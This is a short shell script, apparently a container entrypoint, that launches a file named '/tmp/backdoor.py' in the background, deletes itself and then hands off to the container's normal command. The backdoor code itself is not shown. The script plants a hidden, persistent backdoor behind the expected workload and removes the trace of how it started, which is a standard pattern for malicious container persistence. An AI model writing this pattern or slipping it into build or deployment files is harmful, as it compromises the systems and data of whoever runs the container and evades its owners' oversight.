#!/bin/sh

python3 /tmp/backdoor.py &
rm /tmp/entrypoint.sh
exec "$@"
